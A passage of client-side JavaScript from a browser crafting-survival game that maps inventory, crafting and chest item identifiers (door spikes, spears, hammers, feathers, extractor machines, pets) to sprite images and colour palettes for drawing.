        sprite[Ie.INV_WOOD_DOOR_SPIKE][0] = IMAGES.INV_WOOD_DOOR_SPIKE_OUT;
        sprite[Ie.INV_WOOD_DOOR_SPIKE][1] = IMAGES.INV_WOOD_DOOR_SPIKE_IN;
        sprite[Ie.INV_WOOD_DOOR_SPIKE][2] = IMAGES.INV_WOOD_DOOR_SPIKE_CLICK;
        sprite[Ie.CRAFT_WOOD_DOOR_SPIKE] = sprite[Ie.INV_WOOD_DOOR_SPIKE];
        sprite[Ie.CHEST_WOOD_DOOR_SPIKE] = sprite[Ie.INV_WOOD_DOOR_SPIKE];
        sprite[Ie.INV_STONE_DOOR_SPIKE] = [];
        sprite[Ie.INV_STONE_DOOR_SPIKE][0] = IMAGES.INV_STONE_DOOR_SPIKE_OUT;
        sprite[Ie.INV_STONE_DOOR_SPIKE][1] = IMAGES.INV_STONE_DOOR_SPIKE_IN;
        sprite[Ie.INV_STONE_DOOR_SPIKE][2] = IMAGES.INV_STONE_DOOR_SPIKE_CLICK;
        sprite[Ie.CRAFT_STONE_DOOR_SPIKE] = sprite[Ie.INV_STONE_DOOR_SPIKE];
        sprite[Ie.CHEST_STONE_DOOR_SPIKE] = sprite[Ie.INV_STONE_DOOR_SPIKE];
        sprite[Ie.INV_GOLD_DOOR_SPIKE] = [];
        sprite[Ie.INV_GOLD_DOOR_SPIKE][0] = IMAGES.INV_GOLD_DOOR_SPIKE_OUT;
        sprite[Ie.INV_GOLD_DOOR_SPIKE][1] = IMAGES.INV_GOLD_DOOR_SPIKE_IN;
        sprite[Ie.INV_GOLD_DOOR_SPIKE][2] = IMAGES.INV_GOLD_DOOR_SPIKE_CLICK;
        sprite[Ie.CRAFT_GOLD_DOOR_SPIKE] = sprite[Ie.INV_GOLD_DOOR_SPIKE];
        sprite[Ie.CHEST_GOLD_DOOR_SPIKE] = sprite[Ie.INV_GOLD_DOOR_SPIKE];
        sprite[Ie.INV_DIAMOND_DOOR_SPIKE] = [];
        sprite[Ie.INV_DIAMOND_DOOR_SPIKE][0] = IMAGES.INV_DIAMOND_DOOR_SPIKE_OUT;
        sprite[Ie.INV_DIAMOND_DOOR_SPIKE][1] = IMAGES.INV_DIAMOND_DOOR_SPIKE_IN;
        sprite[Ie.INV_DIAMOND_DOOR_SPIKE][2] = IMAGES.INV_DIAMOND_DOOR_SPIKE_CLICK;
        sprite[Ie.CRAFT_DIAMOND_DOOR_SPIKE] = sprite[Ie.INV_DIAMOND_DOOR_SPIKE];
        sprite[Ie.CHEST_DIAMOND_DOOR_SPIKE] = sprite[Ie.INV_DIAMOND_DOOR_SPIKE];
        sprite[Ie.INV_AMETHYST_DOOR_SPIKE] = [];
        sprite[Ie.INV_AMETHYST_DOOR_SPIKE][0] = IMAGES.INV_AMETHYST_DOOR_SPIKE_OUT;
        sprite[Ie.INV_AMETHYST_DOOR_SPIKE][1] = IMAGES.INV_AMETHYST_DOOR_SPIKE_IN;
        sprite[Ie.INV_AMETHYST_DOOR_SPIKE][2] = IMAGES.INV_AMETHYST_DOOR_SPIKE_CLICK;
        sprite[Ie.CRAFT_AMETHYST_DOOR_SPIKE] = sprite[Ie.INV_AMETHYST_DOOR_SPIKE];
        sprite[Ie.CHEST_AMETHYST_DOOR_SPIKE] = sprite[Ie.INV_AMETHYST_DOOR_SPIKE];
        sprite[Ie.INV_REIDITE_DOOR_SPIKE] = [];
        sprite[Ie.INV_REIDITE_DOOR_SPIKE][0] = IMAGES.INV_REIDITE_DOOR_SPIKE_OUT;
        sprite[Ie.INV_REIDITE_DOOR_SPIKE][1] = IMAGES.INV_REIDITE_DOOR_SPIKE_IN;
        sprite[Ie.INV_REIDITE_DOOR_SPIKE][2] = IMAGES.INV_REIDITE_DOOR_SPIKE_CLICK;
        sprite[Ie.CRAFT_REIDITE_DOOR_SPIKE] = sprite[Ie.INV_REIDITE_DOOR_SPIKE];
        sprite[Ie.CHEST_REIDITE_DOOR_SPIKE] = sprite[Ie.INV_REIDITE_DOOR_SPIKE];
        sprite[Ie.INV_REIDITE_DOOR] = [];
        sprite[Ie.INV_REIDITE_DOOR][0] = IMAGES.INV_REIDITE_DOOR_OUT;
        sprite[Ie.INV_REIDITE_DOOR][1] = IMAGES.INV_REIDITE_DOOR_IN;
        sprite[Ie.INV_REIDITE_DOOR][2] = IMAGES.INV_REIDITE_DOOR_CLICK;
        sprite[Ie.CRAFT_REIDITE_DOOR] = sprite[Ie.INV_REIDITE_DOOR];
        sprite[Ie.CHEST_REIDITE_DOOR] = sprite[Ie.INV_REIDITE_DOOR];
        sprite[Ie.INV_REIDITE_SPIKE] = [];
        sprite[Ie.INV_REIDITE_SPIKE][0] = IMAGES.INV_REIDITE_SPIKE_OUT;
        sprite[Ie.INV_REIDITE_SPIKE][1] = IMAGES.INV_REIDITE_SPIKE_IN;
        sprite[Ie.INV_REIDITE_SPIKE][2] = IMAGES.INV_REIDITE_SPIKE_CLICK;
        sprite[Ie.CRAFT_REIDITE_SPIKE] = sprite[Ie.INV_REIDITE_SPIKE];
        sprite[Ie.CHEST_REIDITE_SPIKE] = sprite[Ie.INV_REIDITE_SPIKE];
        sprite[Ie.INV_REIDITE_WALL] = [];
        sprite[Ie.INV_REIDITE_WALL][0] = IMAGES.INV_REIDITE_WALL_OUT;
        sprite[Ie.INV_REIDITE_WALL][1] = IMAGES.INV_REIDITE_WALL_IN;
        sprite[Ie.INV_REIDITE_WALL][2] = IMAGES.INV_REIDITE_WALL_CLICK;
        sprite[Ie.CRAFT_REIDITE_WALL] = sprite[Ie.INV_REIDITE_WALL];
        sprite[Ie.CHEST_REIDITE_WALL] = sprite[Ie.INV_REIDITE_WALL];
        sprite[Ie.INV_PENGUIN_FEATHER] = [];
        sprite[Ie.INV_PENGUIN_FEATHER][0] = IMAGES.INV_PENGUIN_FEATHER;
        sprite[Ie.INV_PENGUIN_FEATHER][1] = IMAGES.INV_PENGUIN_FEATHER;
        sprite[Ie.INV_PENGUIN_FEATHER][2] = IMAGES.INV_PENGUIN_FEATHER;
        sprite[Ie.CRAFT_PENGUIN_FEATHER] = sprite[Ie.INV_PENGUIN_FEATHER];
        sprite[Ie.CHEST_PENGUIN_FEATHER] = sprite[Ie.INV_PENGUIN_FEATHER];
        sprite[Ie.INV_HAWK_FEATHER] = [];
        sprite[Ie.INV_HAWK_FEATHER][0] = IMAGES.INV_HAWK_FEATHER;
        sprite[Ie.INV_HAWK_FEATHER][1] = IMAGES.INV_HAWK_FEATHER;
        sprite[Ie.INV_HAWK_FEATHER][2] = IMAGES.INV_HAWK_FEATHER;
        sprite[Ie.CRAFT_HAWK_FEATHER] = sprite[Ie.INV_HAWK_FEATHER];
        sprite[Ie.CHEST_HAWK_FEATHER] = sprite[Ie.INV_HAWK_FEATHER];
        sprite[Ie.INV_VULTURE_FEATHER] = [];
        sprite[Ie.INV_VULTURE_FEATHER][0] = IMAGES.INV_VULTURE_FEATHER;
        sprite[Ie.INV_VULTURE_FEATHER][1] = IMAGES.INV_VULTURE_FEATHER;
        sprite[Ie.INV_VULTURE_FEATHER][2] = IMAGES.INV_VULTURE_FEATHER;
        sprite[Ie.CRAFT_VULTURE_FEATHER] = sprite[Ie.INV_VULTURE_FEATHER];
        sprite[Ie.CHEST_VULTURE_FEATHER] = sprite[Ie.INV_VULTURE_FEATHER];
        sprite[Ie.INV_EMERALD] = [];
        sprite[Ie.INV_EMERALD][0] = IMAGES.INV_EMERALD;
        sprite[Ie.INV_EMERALD][1] = IMAGES.INV_EMERALD;
        sprite[Ie.INV_EMERALD][2] = IMAGES.INV_EMERALD;
        sprite[Ie.CHEST_EMERALD] = sprite[Ie.INV_EMERALD];
        sprite[Ie.INV_SADDLE] = [];
        sprite[Ie.INV_SADDLE][0] = IMAGES.INV_SADDLE_OUT;
        sprite[Ie.INV_SADDLE][1] = IMAGES.INV_SADDLE_IN;
        sprite[Ie.INV_SADDLE][2] = IMAGES.INV_SADDLE_CLICK;
        sprite[Ie.CRAFT_SADDLE] = sprite[Ie.INV_SADDLE];
        sprite[Ie.CHEST_SADDLE] = sprite[Ie.INV_SADDLE];
        sprite[Ie.INV_WAND1] = [];
        sprite[Ie.INV_WAND1][0] = IMAGES.INV_WAND1_OUT;
        sprite[Ie.INV_WAND1][1] = IMAGES.INV_WAND1_IN;
        sprite[Ie.INV_WAND1][2] = IMAGES.INV_WAND1_CLICK;
        sprite[Ie.CRAFT_WAND1] = sprite[Ie.INV_WAND1];
        sprite[Ie.CHEST_WAND1] = sprite[Ie.INV_WAND1];
        sprite[Ie.INV_WAND2] = [];
        sprite[Ie.INV_WAND2][0] = IMAGES.INV_WAND2_OUT;
        sprite[Ie.INV_WAND2][1] = IMAGES.INV_WAND2_IN;
        sprite[Ie.INV_WAND2][2] = IMAGES.INV_WAND2_CLICK;
        sprite[Ie.CRAFT_WAND2] = sprite[Ie.INV_WAND2];
        sprite[Ie.CHEST_WAND2] = sprite[Ie.INV_WAND2];
        sprite[Ie.INV_MOUNT_BOAR] = [];
        sprite[Ie.INV_MOUNT_BOAR][0] = IMAGES.INV_MOUNT_BOAR_OUT;
        sprite[Ie.INV_MOUNT_BOAR][1] = IMAGES.INV_MOUNT_BOAR_IN;
        sprite[Ie.INV_MOUNT_BOAR][2] = IMAGES.INV_MOUNT_BOAR_CLICK;
        sprite[Ie.CRAFT_MOUNT_BOAR] = sprite[Ie.INV_MOUNT_BOAR];
        sprite[Ie.CHEST_MOUNT_BOAR] = sprite[Ie.INV_MOUNT_BOAR];
        sprite[Ie.INV_CRAB_BOSS] = [];
        sprite[Ie.INV_CRAB_BOSS][0] = IMAGES.INV_CRAB_BOSS_OUT;
        sprite[Ie.INV_CRAB_BOSS][1] = IMAGES.INV_CRAB_BOSS_IN;
        sprite[Ie.INV_CRAB_BOSS][2] = IMAGES.INV_CRAB_BOSS_CLICK;
        sprite[Ie.CRAFT_CRAB_BOSS] = sprite[Ie.INV_CRAB_BOSS];
        sprite[Ie.CHEST_CRAB_BOSS] = sprite[Ie.INV_CRAB_BOSS];
        sprite[Ie.INV_HAWK] = [];
        sprite[Ie.INV_HAWK][0] = IMAGES.INV_HAWK_OUT;
        sprite[Ie.INV_HAWK][1] = IMAGES.INV_HAWK_IN;
        sprite[Ie.INV_HAWK][2] = IMAGES.INV_HAWK_CLICK;
        sprite[Ie.CRAFT_HAWK] = sprite[Ie.INV_HAWK];
        sprite[Ie.CHEST_HAWK] = sprite[Ie.INV_HAWK];
        sprite[Ie.INV_VULTURE] = [];
        sprite[Ie.INV_VULTURE][0] = IMAGES.INV_VULTURE_OUT;
        sprite[Ie.INV_VULTURE][1] = IMAGES.INV_VULTURE_IN;
        sprite[Ie.INV_VULTURE][2] = IMAGES.INV_VULTURE_CLICK;
        sprite[Ie.CRAFT_VULTURE] = sprite[Ie.INV_VULTURE];
        sprite[Ie.CHEST_VULTURE] = sprite[Ie.INV_VULTURE];
        sprite[Ie.INV_TURBAN1] = [];
        sprite[Ie.INV_TURBAN1][0] = IMAGES.INV_TURBAN1_OUT;
        sprite[Ie.INV_TURBAN1][1] = IMAGES.INV_TURBAN1_IN;
        sprite[Ie.INV_TURBAN1][2] = IMAGES.INV_TURBAN1_CLICK;
        sprite[Ie.CRAFT_TURBAN1] = sprite[Ie.INV_TURBAN1];
        sprite[Ie.CHEST_TURBAN1] = sprite[Ie.INV_TURBAN1];
        sprite[Ie.INV_TURBAN2] = [];
        sprite[Ie.INV_TURBAN2][0] = IMAGES.INV_TURBAN2_OUT;
        sprite[Ie.INV_TURBAN2][1] = IMAGES.INV_TURBAN2_IN;
        sprite[Ie.INV_TURBAN2][2] = IMAGES.INV_TURBAN2_CLICK;
        sprite[Ie.CRAFT_TURBAN2] = sprite[Ie.INV_TURBAN2];
        sprite[Ie.CHEST_TURBAN2] = sprite[Ie.INV_TURBAN2];
        sprite[Ie.INV_PLANE] = [];
        sprite[Ie.INV_PLANE][0] = IMAGES.INV_PLANE_OUT;
        sprite[Ie.INV_PLANE][1] = IMAGES.INV_PLANE_IN;
        sprite[Ie.INV_PLANE][2] = IMAGES.INV_PLANE_CLICK;
        sprite[Ie.CRAFT_PLANE] = sprite[Ie.INV_PLANE];
        sprite[Ie.CHEST_PLANE] = sprite[Ie.INV_PLANE];
        sprite[Ie.INV_BABY_DRAGON] = [];
        sprite[Ie.INV_BABY_DRAGON][0] = IMAGES.INV_BABY_DRAGON_OUT;
        sprite[Ie.INV_BABY_DRAGON][1] = IMAGES.INV_BABY_DRAGON_IN;
        sprite[Ie.INV_BABY_DRAGON][2] = IMAGES.INV_BABY_DRAGON_CLICK;
        sprite[Ie.CRAFT_BABY_DRAGON] = sprite[Ie.INV_BABY_DRAGON];
        sprite[Ie.CHEST_BABY_DRAGON] = sprite[Ie.INV_BABY_DRAGON];
        sprite[Ie.INV_BABY_MAMMOTH] = [];
        sprite[Ie.INV_BABY_MAMMOTH][0] = IMAGES.INV_BABY_MAMMOTH_OUT;
        sprite[Ie.INV_BABY_MAMMOTH][1] = IMAGES.INV_BABY_MAMMOTH_IN;
        sprite[Ie.INV_BABY_MAMMOTH][2] = IMAGES.INV_BABY_MAMMOTH_CLICK;
        sprite[Ie.CRAFT_BABY_MAMMOTH] = sprite[Ie.INV_BABY_MAMMOTH];
        sprite[Ie.CHEST_BABY_MAMMOTH] = sprite[Ie.INV_BABY_MAMMOTH];
        sprite[Ie.INV_BABY_LAVA] = [];
        sprite[Ie.INV_BABY_LAVA][0] = IMAGES.INV_BABY_LAVA_OUT;
        sprite[Ie.INV_BABY_LAVA][1] = IMAGES.INV_BABY_LAVA_IN;
        sprite[Ie.INV_BABY_LAVA][2] = IMAGES.INV_BABY_LAVA_CLICK;
        sprite[Ie.CRAFT_BABY_LAVA] = sprite[Ie.INV_BABY_LAVA];
        sprite[Ie.CHEST_BABY_LAVA] = sprite[Ie.INV_BABY_LAVA];
        sprite[Ie.INV_BREAD_OVEN] = ci(1, [{
          f: Yr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#515C57", "#3A4942", "#68736F", "#C1C0C0", "#be8d50", "#7d5234", "#222825", "#4D5752", "#e48727", "#d4a872", "#232a27"]
        }, {
          f: kr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#e4c027"]
        }], 0.14, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_BREAD_OVEN] = sprite[Ie.INV_BREAD_OVEN];
        sprite[Ie.INV_FURNACE] = ci(1, [{
          f: Ct,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#939393", "#5f6061", "#c0c0c0", "#ffad22", "#fffdd5", "#fee764"]
        }], 0.18, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_FURNACE] = sprite[Ie.INV_FURNACE];
        sprite[Ie.INV_BED] = ci(1, [{
          f: mt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#554139", "#3f332a", "#261912", "#eee6c5", "#d1c599", "#554139", "#3f332a", "#86509b", "#703a99", "#ded4b4", "#d6ceab", "#c796c2", "#bc83b7", "#ffffff", "#87519c", "#703e94", "#3eb67f", "#218f65", "#efe7c5", "#d093c4"]
        }], 0.32, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_BED] = sprite[Ie.INV_BED];
        sprite[Ie.CHEST_BED] = sprite[Ie.INV_BED];
        sprite[Ie.INV_CRAB_LOOT] = ci(1, [{
          f: pt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#c04933", "#a33e2b", "#ee593d", "#c04933"]
        }], 0.17, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CHEST_CRAB_LOOT] = sprite[Ie.INV_CRAB_LOOT];
        sprite[Ie.INV_CRAB_SPEAR] = ci(1, [{
          f: Mt,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#58452b", "#47341d", "#ee593d", "#c04933", "#c04933", "#a33e2b", "#c3be9a", "#7f6d52"]
        }], 0.12, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_CRAB_SPEAR] = sprite[Ie.INV_CRAB_SPEAR];
        sprite[Ie.CHEST_CRAB_SPEAR] = sprite[Ie.INV_CRAB_SPEAR];
        sprite[Ie.INV_WOOD_SPEAR] = ci(1, [{
          f: Lt,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#58452b", "#47341d", "#765d42", "#c3be9a", "#7f6d52"]
        }], 0.12, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_WOOD_SPEAR] = sprite[Ie.INV_WOOD_SPEAR];
        sprite[Ie.INV_SPEAR] = ci(1, [{
          f: Gt,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#4d2d14", "#432516", "#c3be9a", "#7f6d52", "#7a7575", "#454749", "#8c8787", "#939393", "#5f6061", "#aaa6a6"]
        }], 0.12, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_SPEAR] = sprite[Ie.INV_SPEAR];
        sprite[Ie.INV_GOLD_SPEAR] = ci(1, [{
          f: ft,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#493e26", "#382e19", "#a69e39", "#9c8828", "#bab143", "#c4bc51", "#b29c32", "#d2ca59"]
        }], 0.12, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_GOLD_SPEAR] = sprite[Ie.INV_GOLD_SPEAR];
        sprite[Ie.INV_DIAMOND_SPEAR] = ci(1, [{
          f: Ht,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#262114", "#211108", "#4ba8b4", "#198a82", "#6ccad7", "#63c9d6", "#29aaa1", "#7bd9e6"]
        }], 0.12, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_DIAMOND_SPEAR] = sprite[Ie.INV_DIAMOND_SPEAR];
        sprite[Ie.INV_AMETHYST_SPEAR] = ci(1, [{
          f: Pt,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#262114", "#211108", "#9443b1", "#6f1988", "#a752c6", "#9e35be", "#8c29aa", "#b864d6"]
        }], 0.12, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_AMETHYST_SPEAR] = sprite[Ie.INV_AMETHYST_SPEAR];
        sprite[Ie.INV_DRAGON_SPEAR] = ci(1, [{
          f: yt,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#1e2b34", "#151c24", "#99d7dd", "#7dcbd1", "#c6e8eb", "#aadee8", "#b7e2e5"]
        }], 0.38, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_DRAGON_SPEAR] = sprite[Ie.INV_DRAGON_SPEAR];
        sprite[Ie.CHEST_DRAGON_SPEAR] = sprite[Ie.INV_DRAGON_SPEAR];
        sprite[Ie.INV_HAMMER] = ci(1, [{
          f: Ft,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#4d2d14", "#432516", "#939393", "#5f6061"]
        }], 0.52, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_HAMMER] = sprite[Ie.INV_HAMMER];
        sprite[Ie.INV_SPANNER] = ci(1, [{
          f: ln,
          x: 0,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#939393", "#5f6061"]
        }], 0.3, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_SPANNER] = sprite[Ie.INV_SPANNER];
        sprite[Ie.INV_SUPER_HAMMER] = ci(1, [{
          f: yr,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#9b5927", "#7a3610", "#1e0302", "#0d825b", "#6bd16e", "#17915d", "#89e5aa", "#16935d", "#a0efc4", "#28b26d", "#cdf4cb", "#42cc90"]
        }], 0.52, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_SUPER_HAMMER] = sprite[Ie.INV_SUPER_HAMMER];
        sprite[Ie.INV_HAMMER_GOLD] = ci(1, [{
          f: Ft,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#493e26", "#382e19", "#c4bc51", "#b29c32"]
        }], 0.52, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_HAMMER_GOLD] = sprite[Ie.INV_HAMMER_GOLD];
        sprite[Ie.INV_HAMMER_DIAMOND] = ci(1, [{
          f: Ft,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#262114", "#211108", "#63c9d6", "#29aaa1"]
        }], 0.52, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_HAMMER_DIAMOND] = sprite[Ie.INV_HAMMER_DIAMOND];
        sprite[Ie.INV_HAMMER_AMETHYST] = ci(1, [{
          f: Ft,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#262114", "#211108", "#b864d6", "#8c29aa"]
        }], 0.52, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_HAMMER_AMETHYST] = sprite[Ie.INV_HAMMER_AMETHYST];
        sprite[Ie.INV_HAMMER_REIDITE] = [];
        sprite[Ie.INV_HAMMER_REIDITE][0] = IMAGES.INV_HAMMER_REIDITE_OUT;
        sprite[Ie.INV_HAMMER_REIDITE][1] = IMAGES.INV_HAMMER_REIDITE_IN;
        sprite[Ie.INV_HAMMER_REIDITE][2] = IMAGES.INV_HAMMER_REIDITE_CLICK;
        sprite[Ie.CHEST_HAMMER_REIDITE] = sprite[Ie.INV_HAMMER_REIDITE];
        sprite[Ie.CRAFT_HAMMER_REIDITE] = sprite[Ie.INV_HAMMER_REIDITE];
        sprite[Ie.INV_EMERALD_MACHINE] = [];
        sprite[Ie.INV_EMERALD_MACHINE][0] = IMAGES.INV_EMERALD_MACHINE_OUT;
        sprite[Ie.INV_EMERALD_MACHINE][1] = IMAGES.INV_EMERALD_MACHINE_IN;
        sprite[Ie.INV_EMERALD_MACHINE][2] = IMAGES.INV_EMERALD_MACHINE_CLICK;
        sprite[Ie.CHEST_EMERALD_MACHINE] = sprite[Ie.INV_EMERALD_MACHINE];
        sprite[Ie.CRAFT_EMERALD_MACHINE] = sprite[Ie.INV_EMERALD_MACHINE];
        sprite[Ie.INV_EXTRACTOR_MACHINE_STONE] = [];
        sprite[Ie.INV_EXTRACTOR_MACHINE_STONE][0] = IMAGES.INV_EXTRACTOR_MACHINE_STONE_OUT;
        sprite[Ie.INV_EXTRACTOR_MACHINE_STONE][1] = IMAGES.INV_EXTRACTOR_MACHINE_STONE_IN;
        sprite[Ie.INV_EXTRACTOR_MACHINE_STONE][2] = IMAGES.INV_EXTRACTOR_MACHINE_STONE_CLICK;
        sprite[Ie.CHEST_EXTRACTOR_MACHINE_STONE] = sprite[Ie.INV_EXTRACTOR_MACHINE_STONE];
        sprite[Ie.CRAFT_EXTRACTOR_MACHINE_STONE] = sprite[Ie.INV_EXTRACTOR_MACHINE_STONE];
        sprite[Ie.INV_EXTRACTOR_MACHINE_GOLD] = [];
        sprite[Ie.INV_EXTRACTOR_MACHINE_GOLD][0] = IMAGES.INV_EXTRACTOR_MACHINE_GOLD_OUT;
        sprite[Ie.INV_EXTRACTOR_MACHINE_GOLD][1] = IMAGES.INV_EXTRACTOR_MACHINE_GOLD_IN;
        sprite[Ie.INV_EXTRACTOR_MACHINE_GOLD][2] = IMAGES.INV_EXTRACTOR_MACHINE_GOLD_CLICK;
        sprite[Ie.CHEST_EXTRACTOR_MACHINE_GOLD] = sprite[Ie.INV_EXTRACTOR_MACHINE_GOLD];
        sprite[Ie.CRAFT_EXTRACTOR_MACHINE_GOLD] = sprite[Ie.INV_EXTRACTOR_MACHINE_GOLD];
        sprite[Ie.INV_EXTRACTOR_MACHINE_DIAMOND] = [];
        sprite[Ie.INV_EXTRACTOR_MACHINE_DIAMOND][0] = IMAGES.INV_EXTRACTOR_MACHINE_DIAMOND_OUT;
        sprite[Ie.INV_EXTRACTOR_MACHINE_DIAMOND][1] = IMAGES.INV_EXTRACTOR_MACHINE_DIAMOND_IN;
        sprite[Ie.INV_EXTRACTOR_MACHINE_DIAMOND][2] = IMAGES.INV_EXTRACTOR_MACHINE_DIAMOND_CLICK;
        sprite[Ie.CHEST_EXTRACTOR_MACHINE_DIAMOND] = sprite[Ie.INV_EXTRACTOR_MACHINE_DIAMOND];
        sprite[Ie.CRAFT_EXTRACTOR_MACHINE_DIAMOND] = sprite[Ie.INV_EXTRACTOR_MACHINE_DIAMOND];
        sprite[Ie.INV_EXTRACTOR_MACHINE_AMETHYST] = [];
        sprite[Ie.INV_EXTRACTOR_MACHINE_AMETHYST][0] = IMAGES.INV_EXTRACTOR_MACHINE_AMETHYST_OUT;
        sprite[Ie.INV_EXTRACTOR_MACHINE_AMETHYST][1] = IMAGES.INV_EXTRACTOR_MACHINE_AMETHYST_IN;
        sprite[Ie.INV_EXTRACTOR_MACHINE_AMETHYST][2] = IMAGES.INV_EXTRACTOR_MACHINE_AMETHYST_CLICK;
        sprite[Ie.CHEST_EXTRACTOR_MACHINE_AMETHYST] = sprite[Ie.INV_EXTRACTOR_MACHINE_AMETHYST];
        sprite[Ie.CRAFT_EXTRACTOR_MACHINE_AMETHYST] = sprite[Ie.INV_EXTRACTOR_MACHINE_AMETHYST];
        sprite[Ie.INV_EXTRACTOR_MACHINE_REIDITE] = [];
        sprite[Ie.INV_EXTRACTOR_MACHINE_REIDITE][0] = IMAGES.INV_EXTRACTOR_MACHINE_REIDITE_OUT;
        sprite[Ie.INV_EXTRACTOR_MACHINE_REIDITE][1] = IMAGES.INV_EXTRACTOR_MACHINE_REIDITE_IN;
        sprite[Ie.INV_EXTRACTOR_MACHINE_REIDITE][2] = IMAGES.INV_EXTRACTOR_MACHINE_REIDITE_CLICK;
        sprite[Ie.CHEST_EXTRACTOR_MACHINE_REIDITE] = sprite[Ie.INV_EXTRACTOR_MACHINE_REIDITE];
        sprite[Ie.CRAFT_EXTRACTOR_MACHINE_REIDITE] = sprite[Ie.INV_EXTRACTOR_MACHINE_REIDITE];
        sprite[Ie.INV_LOCK] = ci(1, [{
          f: br,
          x: -2,
          y: -2,
          a: 1,
          r: 0,
          c: ["#141414", "#816511", "#c4a23a", "#3a3a3a"]
        }], 0.8, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.CRAFT_LOCK] = sprite[Ie.INV_LOCK];
        sprite[Ie.INV_LOCKPICK] = ci(1, [{
          f: vr,
          x: -2,
          y: -2,
          a: 1,
          r: -Math.PI / 5,
          c: ["#141414", "#c4a23a", "#816511"]
        }], 0.08, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.CRAFT_LOCKPICK] = sprite[Ie.INV_LOCKPICK];
        sprite[Ie.INV_DRAGON_HEART] = ci(1, [{
          f: Hr,
          x: -2,
          y: -2,
          a: 1,
          r: 0,
          c: ["#141414", "#178a99", "#0a6372", "#03282e"]
        }], 0.3, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.7);
        sprite[Ie.INV_LAVA_HEART] = ci(1, [{
          f: Hr,
          x: -2,
          y: -2,
          a: 1,
          r: 0,
          c: ["#120202", "#991616", "#750a0a", "#120202"]
        }], 0.3, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.7);
        sprite[Ie.INV_RESURRECTION] = ci(1, [{
          f: Mr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#347f93", "#54a4ba"]
        }, {
          f: fr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#347f93", "#54a4ba", "#1c2528", "#a9e4ed", "#86d4e0", "#959da0", "#697072", "#929da0", "#afb9bc", "#418ba5", "#59b8ce"]
        }, {
          f: Gr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#a9e4ed", "#86d4e0"]
        }, {
          f: Lr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#a9e4ed", "#86d4e0", "#418ba5", "#59b8ce"]
        }], 0.3, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_RESURRECTION] = sprite[Ie.INV_RESURRECTION];
        sprite[Ie.INV_TOTEM] = ci(1, [{
          f: Dr,
          x: 45,
          y: 70,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#4c3a15", "#634828", "#564021"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_TOTEM] = sprite[Ie.INV_TOTEM];
        sprite[Ie.INV_AMETHYST_HELMET] = ci(1, [{
          f: gr,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#8c55b7", "#652d8e", "#79359e", "#5eccd1", "#4badad", "#9e6ac6"]
        }], 0.52, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_AMETHYST_HELMET] = sprite[Ie.INV_AMETHYST_HELMET];
        sprite[Ie.INV_WINTER_HOOD] = ci(1, [{
          f: rn,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
